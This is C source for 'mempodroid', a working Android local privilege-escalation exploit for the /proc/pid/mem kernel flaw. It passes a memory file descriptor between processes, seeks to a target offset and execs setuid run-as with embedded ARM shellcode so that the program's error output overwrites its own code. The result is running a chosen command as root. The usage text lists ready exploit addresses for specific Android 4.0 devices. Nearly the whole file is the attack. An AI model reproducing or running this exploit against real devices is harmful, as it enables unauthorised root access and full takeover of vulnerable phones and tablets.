/* mempodroid - implementation of /proc/#/mem exploit for Android
* Copyright (C) 2012 Jay Freeman (saurik)
*/

/* Modified BSD License {{{ */
/*
* Redistribution and use in source and binary
* forms, with or without modification, are permitted
* provided that the following conditions are met:
*
* 1. Redistributions of source code must retain the
* above copyright notice, this list of conditions
* and the following disclaimer.
* 2. Redistributions in binary form must reproduce the
* above copyright notice, this list of conditions
* and the following disclaimer in the documentation
* and/or other materials provided with the
* distribution.
* 3. The name of the author may not be used to endorse
* or promote products derived from this software
* without specific prior written permission.
*
* THIS SOFTWARE IS PROVIDED BY THE AUTHOR ``AS IS''
* AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING,
* BUT NOT LIMITED TO, THE IMPLIED WARRANTIES OF
* MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
* ARE DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE
* LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
* EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT
* NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
* SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
* INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
* LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR
* TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
* ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF
* ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
*/
/* }}} */

#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <fcntl.h>
#include <errno.h>
#include <stdbool.h>

#define argv0 "xe-jM_uH"

#define _syscall(expr) ({ \
__typeof__(expr) _value; \
for(;;) if ((long) (_value = (expr)) != -1) \
break; \
else if (errno != EINTR) { \
char line[1024]; \
sprintf(line, "(%u)", __LINE__); \
perror(line); \
exit(1); \
} \
_value; \
})

#define _assert(test) do { \
if (!(test)) { \
fprintf(stderr, "_assert(%s)\n", #test); \
exit(1); \
} \
} while (false)

static int child(int sock) {
    char path[32];
    sprintf(path, "/proc/%u/mem", getppid());
    int mem = _syscall(open(path, O_WRONLY));

    uint8_t data[1] = {0};

    struct iovec iov;
    iov.iov_base = data;
    iov.iov_len = sizeof(data);

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    char control[CMSG_SPACE(sizeof(int))];
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);

    struct cmsghdr *cmsg;
    cmsg = CMSG_FIRSTHDR(&msg);
    cmsg->cmsg_len = CMSG_LEN(sizeof(int));
    cmsg->cmsg_level = SOL_SOCKET;
    cmsg->cmsg_type = SCM_RIGHTS;
    * (int *) CMSG_DATA(cmsg) = mem;

    _syscall(sendmsg(sock, &msg, 0));
    return 0;
}

static int parent(int sock, int argc, char *argv[]) {
    uint8_t data[1024];

    struct iovec iov;
    iov.iov_base = data;
    iov.iov_len = sizeof(data);

    struct msghdr msg;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;

    char control[CMSG_SPACE(sizeof(int))];
    msg.msg_control = control;
    msg.msg_controllen = sizeof(control);

    _syscall(recvmsg(sock, &msg, 0));

    struct cmsghdr *cmsg;
    cmsg = CMSG_FIRSTHDR(&msg);
    _assert(cmsg != NULL);

    _assert(cmsg->cmsg_len == CMSG_SPACE(sizeof(int)));
    _assert(cmsg->cmsg_level == SOL_SOCKET);
    _assert(cmsg->cmsg_type == SCM_RIGHTS);

    int mem = * (int *) CMSG_DATA(cmsg);
    _assert(mem != -1);

    --argc; ++argv;

    off_t offset = strtoul(argv[0], NULL, 0);
    off_t rest = strtoul(argv[1], NULL, 0);

    argc -= 2;
    argv += 2;

#ifdef __arm__
    const uint16_t exploit[] = {
        0xbc73, // pop {r0, r1, r4, r5, r6}
        0x2501, // mov r5, #1
        0x3d01, // sub r5, #1

        // movw r3, *rest
        0xf640 | (rest & 0x0800) >> 1 | (rest & 0xf000) >> 12,
        0x0300 | (rest & 0x0700) << 4 | (rest & 0x00ff),

        0x4718, // bx r3
    0};
#endif

    offset -= 17;
    lseek(mem, offset, SEEK_SET);

    _assert(memchr(exploit, 0, sizeof(exploit)) == exploit + sizeof(exploit) / sizeof(exploit[0]) - 1);

    int save = dup(2);

    dup2(mem, 2);
    close(mem);

    if (save != 3) {
        dup2(save, 3);
        close(save);
    }

    char self[1024];
    _syscall(readlink("/proc/self/exe", self, sizeof(self) - 1));

    char *args[4 + argc + 1];
    args[0] = strdup("run-as");
    args[1] = (char *) exploit;
    args[2] = self;
    args[3] = strdup("-");

    int i;
    for (i = 0; i != argc; ++i)
        args[4 + i] = argv[i];
    args[4 + i] = NULL;

    _syscall(execv("/system/bin/run-as", args));
    return 0;
}

int main(int argc, char *argv[]) {
    if (argc == 1) {
        printf(
            "usage: mempodroid <exit> <call> <args...>\n"
            " exit: address in memory to exit function\n"
            " call: address in memory of setresuid call\n"
            " args: command to run, including arguments\n"
            "\n"
          /*" NOTE: to attempt autodetect, pass '-'\n"
" for either exit, call, or both\n");*/
            " Acer A200 Tablet 4.0.3: 0xd9f0 0xaf47\n"
            " Galaxy Nexus 4.0.2: 0xd7f4 0xad4b\n"
            " Motorola RAZR 4.0.3: 0xd6c4 0xad33\n"
            " Nexus S 4.0.2: 0xd7cc 0xad27\n"
            " Transformer Prime 4.0.3: 0xd9ec 0xaf47\n"
            "\n"
            "concrete implementation by Jay Freeman (saurik)\n"
            "based on exploit by Jason A. Donenfeld (zx2c4)\n"
            "more information at: http://blog.zx2c4.com/749\n"
            "original kernel exploit reported by Jüri Aedla\n"
        );

        return 0;
    }

    if (strcmp(argv[1], "-") == 0) {
        dup2(3, 2);
        close(3);

        _syscall(execvp(argv[2], argv + 2));
        return 1;
    }

    int pair[2];
    _syscall(socketpair(PF_UNIX, SOCK_DGRAM, 0, pair));

    if (strcmp(argv[0], argv0) == 0)
        return child(strtoul(argv[1], NULL, 0));

    pid_t pid = fork();
    if (pid != 0) {
        close(pair[1]);
        return parent(pair[0], argc, argv);
    }

    close(pair[0]);
    char argv1[16];
    sprintf(argv1, "%u", pair[1]);

    _syscall(execl("/proc/self/exe", argv0, argv1, NULL));
    return 1;
}
